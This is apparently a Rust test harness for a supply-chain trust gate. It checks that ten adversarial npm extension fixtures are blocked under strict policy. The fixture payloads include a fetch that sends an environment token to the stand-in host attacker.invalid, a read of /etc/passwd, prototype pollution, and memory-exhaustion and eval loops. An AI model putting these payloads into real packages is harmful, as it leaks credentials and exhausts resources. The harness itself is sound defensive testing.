use ed25519_dalek::{Signer, SigningKey};
use frankenengine_node::supply_chain::certification::{EvidenceType, VerifiedEvidenceRef};
use frankenengine_node::supply_chain::trust_card::{
    BehavioralProfile, CapabilityDeclaration, CapabilityRisk, CertificationLevel,
    DependencyTrustStatus, ExtensionIdentity, ProvenanceSummary, PublisherIdentity,
    ReputationTrend, RevocationStatus, RiskAssessment, RiskLevel, TrustCardInput,
    TrustCardRegistry,
};
use serde::Serialize;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};

const ARTIFACT_RELATIVE_PATH: &str = "artifacts/adversarial/compromise_reduction_v1.json";
const TRUST_CARD_REGISTRY_RELATIVE_PATH: &str = ".franken-node/state/trust-card-registry.v1.json";
const FIXTURE_SIGNING_KEY_BYTES: [u8; 32] = [0x42; 32];

#[derive(Clone, Copy)]
struct AdversarialExtensionFixture {
    case_id: &'static str,
    package_name: &'static str,
    version_requirement: &'static str,
    attack_vector: &'static str,
    payload_file: &'static str,
    payload_body: &'static str,
}

#[derive(Clone, Serialize)]
struct AdversarialCaseOutcome {
    case_id: String,
    extension_id: String,
    attack_vector: String,
    version_requirement: String,
    policy: String,
    expected_control: String,
    outcome: String,
    blocked: bool,
    contained: bool,
    exit_code: Option<i32>,
    typed_errors: Vec<String>,
    result_statuses: Vec<String>,
}

#[derive(Serialize)]
struct HarnessMetadata {
    command: &'static str,
    enforcement_path: &'static str,
    fixture_count: usize,
}

#[derive(Serialize)]
struct HarnessTotals {
    cases: usize,
    blocked: usize,
    not_blocked: usize,
}

#[derive(Serialize)]
struct CompromiseReductionArtifact {
    schema_version: &'static str,
    artifact_id: &'static str,
    charter_gap: &'static str,
    generated_at_utc: &'static str,
    harness: HarnessMetadata,
    totals: HarnessTotals,
    cases: Vec<AdversarialCaseOutcome>,
}

#[derive(Serialize)]
struct ArtifactSignature {
    algorithm: &'static str,
    key_id: &'static str,
    public_key: String,
    payload_sha256: String,
    value: String,
}

#[derive(Serialize)]
struct SignedCompromiseReductionArtifact {
    #[serde(flatten)]
    payload: CompromiseReductionArtifact,
    signature: ArtifactSignature,
}

const FIXTURES: &[AdversarialExtensionFixture] = &[
    AdversarialExtensionFixture {
        case_id: "malicious-postinstall",
        package_name: "@adversarial/malicious-postinstall",
        version_requirement: "1.0.0",
        attack_vector: "malicious package postinstall hook",
        payload_file: "postinstall.js",
        payload_body: "throw new Error('fixture would exfiltrate install-time secrets');\n",
    },
    AdversarialExtensionFixture {
        case_id: "prototype-pollution",
        package_name: "@adversarial/prototype-pollution",
        version_requirement: "1.0.0",
        attack_vector: "Object prototype pollution during extension bootstrap",
        payload_file: "pollute.js",
        payload_body: "Object.prototype.franken_admin = true;\n",
    },
    AdversarialExtensionFixture {
        case_id: "ambient-authority-abuse",
        package_name: "@adversarial/ambient-authority-abuse",
        version_requirement: "1.0.0",
        attack_vector: "ambient filesystem and environment authority abuse",
        payload_file: "ambient.js",
        payload_body: "process.env.FRANKEN_TOKEN; require('fs').readFileSync('/etc/passwd');\n",
    },
    AdversarialExtensionFixture {
        case_id: "egress-to-unknown-host",
        package_name: "@adversarial/egress-to-unknown-host",
        version_requirement: "1.0.0",
        attack_vector: "network egress to an undeclared external host",
        payload_file: "egress.js",
        payload_body: "fetch('https://attacker.invalid/collect?token=' + process.env.FRANKEN_TOKEN);\n",
    },
    AdversarialExtensionFixture {
        case_id: "memory-exhaust",
        package_name: "@adversarial/memory-exhaust",
        version_requirement: "1.0.0",
        attack_vector: "unbounded heap allocation during extension init",
        payload_file: "memory.js",
        payload_body: "const chunks = []; while (true) chunks.push(Buffer.alloc(1024 * 1024));\n",
    },
    AdversarialExtensionFixture {
        case_id: "infinite-eval-loop",
        package_name: "@adversarial/infinite-eval-loop",
        version_requirement: "1.0.0",
        attack_vector: "non-terminating eval loop",
        payload_file: "eval-loop.js",
        payload_body: "while (true) eval('1 + 1');\n",
    },
    AdversarialExtensionFixture {
        case_id: "trust-card-forgery-attempt",
        package_name: "@adversarial/trust-card-forgery-attempt",
        version_requirement: "1.0.0",
        attack_vector: "forged trust-card metadata shipped inside the extension",
        payload_file: "forged-trust-card.json",
        payload_body: "{\"extension_id\":\"npm:@adversarial/trust-card-forgery-attempt\",\"signature\":\"forged\"}\n",
    },
    AdversarialExtensionFixture {
        case_id: "unsigned-artifact",
        package_name: "@adversarial/unsigned-artifact",
        version_requirement: "1.0.0",
        attack_vector: "extension artifact without provenance signature",
        payload_file: "artifact.manifest.json",
        payload_body: "{\"artifact\":\"dist/extension.tgz\",\"signature\":null}\n",
    },
    AdversarialExtensionFixture {
        case_id: "stale-revocation-exploit",
        package_name: "@adversarial/stale-revocation-exploit",
        version_requirement: "1.0.0",
        attack_vector: "attempt to rely on stale revocation state",
        payload_file: "revocation-state.json",
        payload_body: "{\"revocation_epoch\":0,\"claims_fresh\":true}\n",
    },
    AdversarialExtensionFixture {
        case_id: "mislabeled-mime",
        package_name: "@adversarial/mislabeled-mime",
        version_requirement: "1.0.0",
        attack_vector: "JavaScript payload mislabeled as a benign MIME type",
        payload_file: "payload.mime.json",
        payload_body: "{\"declared_mime\":\"image/png\",\"actual_payload\":\"module.exports = eval\"}\n",
    },
];

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(exe);
    }
    if let Some(target_dir) = std::env::var_os("CARGO_TARGET_DIR") {
        return PathBuf::from(target_dir).join("debug/franken-node");
    }
    repo_root().join("target/debug/franken-node")
}

fn run_cli_in_workspace(workspace: &Path, args: &[String]) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    Command::new(&binary_path)
        .current_dir(workspace)
        .args(args)
        .output()
        .unwrap_or_else(|err| panic!("failed running `franken-node {}`: {err}", args.join(" ")))
}

fn parse_json_stdout(output: &Output, context: &str) -> Value {
    let stdout = String::from_utf8_lossy(&output.stdout);
    serde_json::from_str(&stdout)
        .unwrap_or_else(|err| panic!("{context} should emit valid JSON: {err}\nstdout:\n{stdout}"))
}

fn args(items: &[&str]) -> Vec<String> {
    items.iter().map(|item| (*item).to_string()).collect()
}

fn fixture_scripts(fixture: &AdversarialExtensionFixture) -> Value {
    match fixture.case_id {
        "malicious-postinstall" => json!({"postinstall": "node postinstall.js"}),
        "infinite-eval-loop" => json!({"start": "node eval-loop.js"}),
        "memory-exhaust" => json!({"start": "node memory.js"}),
        _ => json!({"start": format!("node {}", fixture.payload_file)}),
    }
}

fn fixture_requested_capabilities(fixture: &AdversarialExtensionFixture) -> Value {
    match fixture.case_id {
        "ambient-authority-abuse" => json!(["fs:read:*", "env:read:*"]),
        "egress-to-unknown-host" => json!(["net:egress:*"]),
        "memory-exhaust" => json!(["memory:unbounded"]),
        "infinite-eval-loop" => json!(["eval:dynamic"]),
        "trust-card-forgery-attempt" => json!(["trust-card:write"]),
        _ => json!([]),
    }
}

fn fixture_package_manifest(fixture: &AdversarialExtensionFixture) -> Value {
    json!({
        "name": fixture.package_name,
        "version": fixture.version_requirement,
        "main": fixture.payload_file,
        "scripts": fixture_scripts(fixture),
        "franken_adversarial_fixture": {
            "case_id": fixture.case_id,
            "attack_vector": fixture.attack_vector,
            "expected_control": "strict trust preflight revocation denial"
        },
        "franken_requested_capabilities": fixture_requested_capabilities(fixture),
    })
}

fn write_fixture_workspace(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let fixture_dir = workspace.join("fixtures").join(fixture.case_id);
    fs::create_dir_all(&fixture_dir).expect("create adversarial fixture directory");
    fs::write(
        fixture_dir.join("package.json"),
        serde_json::to_string_pretty(&fixture_package_manifest(fixture))
            .expect("serialize fixture package manifest"),
    )
    .expect("write adversarial fixture package manifest");
    fs::write(fixture_dir.join(fixture.payload_file), fixture.payload_body)
        .expect("write adversarial fixture payload");

    let mut dependencies = serde_json::Map::new();
    dependencies.insert(
        fixture.package_name.to_string(),
        Value::String(fixture.version_requirement.to_string()),
    );
    let manifest = json!({
        "name": format!("adversarial-extension-harness-{}", fixture.case_id),
        "version": "1.0.0",
        "private": true,
        "main": "index.js",
        "dependencies": dependencies,
    });
    fs::write(
        workspace.join("package.json"),
        serde_json::to_string_pretty(&manifest).expect("serialize root package manifest"),
    )
    .expect("write root package manifest");
    fs::write(
        workspace.join("index.js"),
        "console.log('not reached by blocked preflight');\n",
    )
    .expect("write app entrypoint");
}

fn fixture_evidence_refs(fixture: &AdversarialExtensionFixture) -> Vec<VerifiedEvidenceRef> {
    let evidence_hash = Sha256::digest(format!("adversarial-evidence:{}", fixture.case_id));
    vec![VerifiedEvidenceRef {
        evidence_id: format!("adv-ext-{}-revocation", fixture.case_id),
        evidence_type: EvidenceType::RevocationCheck,
        verified_at_epoch: 2_026_042_000,
        verification_receipt_hash: hex::encode(evidence_hash),
    }]
}

fn write_revoked_trust_registry(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let mut registry = TrustCardRegistry::default();
    let payload_hash = Sha256::digest(fixture.payload_body.as_bytes());
    let extension_id = format!("npm:{}", fixture.package_name);

    registry
        .create(
            TrustCardInput {
                extension: ExtensionIdentity {
                    extension_id,
                    version: fixture.version_requirement.to_string(),
                },
                publisher: PublisherIdentity {
                    publisher_id: "pub-adversarial-fixtures".to_string(),
                    display_name: "Adversarial Fixture Publisher".to_string(),
                },
                certification_level: CertificationLevel::Bronze,
                capability_declarations: vec![CapabilityDeclaration {
                    name: format!("adversarial.{}", fixture.case_id),
                    description: fixture.attack_vector.to_string(),
                    risk: CapabilityRisk::Critical,
                }],
                behavioral_profile: BehavioralProfile {
                    network_access: fixture.case_id == "egress-to-unknown-host",
                    filesystem_access: fixture.case_id == "ambient-authority-abuse",
                    subprocess_access: false,
                    profile_summary: fixture.attack_vector.to_string(),
                },
                revocation_status: RevocationStatus::Revoked {
                    reason: format!("adversarial extension fixture: {}", fixture.attack_vector),
                    revoked_at: "2026-04-20T00:00:00Z".to_string(),
                },
                provenance_summary: ProvenanceSummary {
                    attestation_level: "fixture-revoked".to_string(),
                    source_uri: format!("fixture://adversarial-extension/{}", fixture.case_id),
                    artifact_hashes: vec![format!("sha256:{}", hex::encode(payload_hash))],
                    verified_at: "2026-04-20T00:00:00Z".to_string(),
                },
                reputation_score_basis_points: 0,
                reputation_trend: ReputationTrend::Declining,
                active_quarantine: true,
                dependency_trust_summary: vec![DependencyTrustStatus {
                    dependency_id: "npm:fixture-transitive@0".to_string(),
                    trust_level: "revoked-fixture".to_string(),
                }],
                last_verified_timestamp: "2026-04-20T00:00:00Z".to_string(),
                user_facing_risk_assessment: RiskAssessment {
                    level: RiskLevel::Critical,
                    summary: format!(
                        "Strict policy must block adversarial fixture {}",
                        fixture.case_id
                    ),
                },
                evidence_refs: fixture_evidence_refs(fixture),
            },
            2_026_042_000,
            "trace-adversarial-extension-harness",
        )
        .expect("create revoked adversarial trust card");

    registry
        .persist_authoritative_state(&workspace.join(TRUST_CARD_REGISTRY_RELATIVE_PATH))
        .expect("persist revoked adversarial trust registry");
}

fn collect_string_field(payload: &Value, array_field: &str, nested_field: &str) -> Vec<String> {
    payload["verdict"][array_field]
        .as_array()
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item[nested_field].as_str().map(ToString::to_string))
                .collect()
        })
        .unwrap_or_default()
}

fn run_fixture(fixture: &AdversarialExtensionFixture) -> AdversarialCaseOutcome {
    let workspace = tempfile::tempdir().expect("create adversarial fixture workspace");
    write_fixture_workspace(workspace.path(), fixture);
    write_revoked_trust_registry(workspace.path(), fixture);

    let extension_id = format!("npm:{}", fixture.package_name);
    let run_args = args(&["run", "--policy", "strict", "--json", "."]);
    let run_output = run_cli_in_workspace(workspace.path(), &run_args);
    let run_payload = parse_json_stdout(&run_output, "strict adversarial run");
    let typed_errors = collect_string_field(&run_payload, "violations", "kind");
    let result_statuses = collect_string_field(&run_payload, "results", "status");
    let blocked = !run_output.status.success() && run_payload["verdict"]["status"] == "blocked";
    let contained = run_payload["receipt"]["decision"] == "denied";
    let outcome = if blocked || contained {
        "blocked"
    } else {
        "not_blocked"
    };

    AdversarialCaseOutcome {
        case_id: fixture.case_id.to_string(),
        extension_id,
        attack_vector: fixture.attack_vector.to_string(),
        version_requirement: fixture.version_requirement.to_string(),
        policy: "strict".to_string(),
        expected_control: "strict trust preflight denies revoked dependency".to_string(),
        outcome: outcome.to_string(),
        blocked,
        contained,
        exit_code: run_output.status.code(),
        typed_errors,
        result_statuses,
    }
}

fn sign_artifact(payload: CompromiseReductionArtifact) -> SignedCompromiseReductionArtifact {
    let payload_bytes = serde_json::to_vec(&payload).expect("serialize artifact payload");
    let payload_sha256 = Sha256::digest(&payload_bytes);
    let signing_key = SigningKey::from_bytes(&FIXTURE_SIGNING_KEY_BYTES);
    let signature = signing_key.sign(&payload_bytes);

    SignedCompromiseReductionArtifact {
        payload,
        signature: ArtifactSignature {
            algorithm: "ed25519-fixture-v1",
            key_id: "adversarial-extension-harness-v1",
            public_key: hex::encode(signing_key.verifying_key().to_bytes()),
            payload_sha256: format!("sha256:{}", hex::encode(payload_sha256)),
            value: format!("ed25519:{}", hex::encode(signature.to_bytes())),
        },
    }
}

fn write_signed_summary(outcomes: &[AdversarialCaseOutcome]) -> SignedCompromiseReductionArtifact {
    let blocked = outcomes
        .iter()
        .filter(|outcome| outcome.outcome == "blocked")
        .count();
    let payload = CompromiseReductionArtifact {
        schema_version: "1.0.0",
        artifact_id: "compromise_reduction_v1",
        charter_gap: "reality-check-charter-section-5-compromise-reduction-gap",
        generated_at_utc: "2026-04-20T00:00:00Z",
        harness: HarnessMetadata {
            command: "franken-node run --policy strict --json .",
            enforcement_path: "run preflight trust gate over authoritative trust-card registry",
            fixture_count: outcomes.len(),
        },
        totals: HarnessTotals {
            cases: outcomes.len(),
            blocked,
            not_blocked: outcomes.len().saturating_sub(blocked),
        },
        cases: outcomes.to_vec(),
    };
    let signed = sign_artifact(payload);
    let artifact_path = repo_root().join(ARTIFACT_RELATIVE_PATH);
    let bytes = serde_json::to_vec_pretty(&signed).expect("serialize signed artifact");
    fs::write(artifact_path, [bytes, b"\n".to_vec()].concat()).expect("write signed artifact");
    signed
}

#[test]
fn adversarial_extension_fixtures_are_blocked_by_strict_policy() {
    let outcomes = FIXTURES.iter().map(run_fixture).collect::<Vec<_>>();
    let signed_artifact = write_signed_summary(&outcomes);

    assert_eq!(outcomes.len(), 10);
    assert_eq!(signed_artifact.payload.totals.cases, outcomes.len());
    assert_eq!(signed_artifact.payload.totals.not_blocked, 0);
    assert!(
        signed_artifact
            .signature
            .payload_sha256
            .starts_with("sha256:")
    );
    assert!(signed_artifact.signature.value.starts_with("ed25519:"));

    for outcome in &outcomes {
        assert_eq!(
            outcome.outcome, "blocked",
            "{} should be blocked or contained by strict policy",
            outcome.case_id
        );
        assert!(
            outcome.typed_errors.iter().any(|kind| kind == "revoked"),
            "{} should fail with the typed revoked trust violation, got {:?}",
            outcome.case_id,
            outcome.typed_errors
        );
        assert!(
            outcome
                .result_statuses
                .iter()
                .any(|status| status == "revoked"),
            "{} should report the dependency result as revoked, got {:?}",
            outcome.case_id,
            outcome.result_statuses
        );
    }
}
